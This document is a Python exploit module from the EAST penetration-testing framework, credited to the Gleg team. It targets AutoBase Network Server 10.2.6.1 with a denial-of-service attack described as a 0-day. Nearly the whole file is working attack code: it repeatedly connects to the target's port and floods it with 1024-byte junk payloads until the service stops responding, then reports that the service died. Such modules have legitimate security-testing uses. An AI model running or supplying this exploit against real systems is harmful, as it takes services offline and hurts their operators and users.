#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import time
import socket

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_autobase_netserver_dos"
INFO['DESCRIPTION'] = "AutoBase Network Server 10.2.6.1 Denial Of Service"
INFO['VENDOR'] = "http://www.autobase.biz"
INFO['DOWNLOAD_LINK'] = 'http://file.autobase.biz/Autobase/ExeFiles/Autobase_10_2_6.exe'
INFO['LINKS'] = ''
INFO["CVE Name"] = "0-day"
INFO["NOTES"] = """
Tested against AutoBase Network Server 10.2.6.1
"""

INFO['CHANGELOG'] = "10 Mar, 2016. Written by Gleg team."
INFO['PATH'] = 'Exploits/DoS/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1"
OPTIONS["PORT"] = 7001

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.ssl = None
        self.state = "running"
        return
    
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        return
        
    def makesploit(self):
        return 'A' * 1024
        
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        data = self.makesploit()
        for i in xrange(10000):
            s = socket.socket()
            #s.settimeout(10)
            try:
                s.connect((self.host, self.port))
                s.sendall(data)
                s.close()
            except:
                self.log("Attack reported no open socket - service died?")
                self.log("Service died after {} sent packets".format(i))
                self.finish(True)
                return 1
                
        self.log("Finished this exploit")
        self.finish(False)
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
